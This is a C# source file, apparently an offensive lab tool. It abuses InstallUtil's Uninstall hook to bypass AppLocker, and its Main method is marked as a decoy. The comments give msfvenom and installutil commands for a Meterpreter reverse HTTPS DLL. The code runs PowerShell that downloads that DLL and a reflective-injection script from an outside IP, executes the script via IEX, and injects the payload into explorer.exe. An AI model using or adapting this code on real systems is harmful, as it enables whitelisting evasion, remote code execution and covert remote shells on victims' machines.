//script to leverage installUtil to bypass AppLocker w/ powershell reflective DLL injection 
//msfvenom -p windows/x64/meterpreter/reverse_https lhost= lport=443 -f dll 
//C:\Windows\Microsoft.NET\Framework64\Framework\v4.0.30319\installlutil.exe /logfile= /LogToConsole=false /U C:\<path_to_file>

using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            //download msfvenom payload (met.dll) & Invoke-ReflectPEInjection.ps1 
            String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.201/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.45.201/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}v
